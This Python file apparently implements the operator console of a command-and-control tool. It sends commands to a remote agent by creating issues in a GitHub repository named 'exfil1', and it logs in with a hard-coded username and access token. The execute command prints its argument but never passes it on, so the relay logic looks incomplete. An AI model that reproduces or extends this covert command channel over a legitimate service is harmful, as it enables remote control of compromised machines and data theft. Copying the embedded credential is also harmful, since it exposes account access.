from github import Github
from github.GithubException import GithubException
from github.GithubObject import NotSet
from uuid import uuid4
from yaml import load, dump, scanner
import cmd
import ghlib

class GitClient(cmd.Cmd):
	"""Shuttles async commands via Github"""
	def __init__(self):
		cmd.Cmd.__init__(self)
		self.prompt = '> '

	def do_execute(self, lcommand):
		"""execute <command [arguments]>
		Send `command` and its arguments to server """
		if lcommand:
			print("Executing {}".format(lcommand))
			ghlib.createIssue(self.agentid, self.repo, self.reqfile)
		else:
			print('Need command')

	def do_EOF(self, line):
		return True

	def preloop(self):

		user_name="drtkn"
		token="dbba5bd20be0a59543762bd19e881d351ce118c7"
		repo_name="exfil1"

		self.agentid="a932e9f5-2501-4c60-b5da-8a61ac244792"
		self.g = Github(user_name, token)
		self.user=self.g.get_user()

		#print("== List of repos  for user {}...".format(user))
		#for repo in self.g.get_user().get_repos():
		#	print(repo.name)

		self.reqfile="./instructions"
		self.repo=ghlib.checkRepoExists(self.user,repo_name)
		if self.repo is None:
			#repo.create_file('/agent1/filename2', 'commitmessage', 'content')
			#Create issue with a request
			self.repo=ghlib.createRepo(self.user,repo_name) 

